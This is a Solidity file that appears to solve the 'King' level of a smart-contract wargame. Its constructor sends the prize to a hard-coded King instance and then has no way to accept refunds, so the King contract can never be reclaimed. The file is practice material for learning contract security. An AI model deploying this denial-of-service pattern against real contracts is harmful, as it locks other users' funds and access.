// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel09.sol";

contract Newking{
    King level9 = King(payable(0x397Bb948BE20486e9165Ac86E9a37e4A3EB169bb));
    constructor() public payable{
        ((address)(level9)).call{value: level9.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize
    }
}

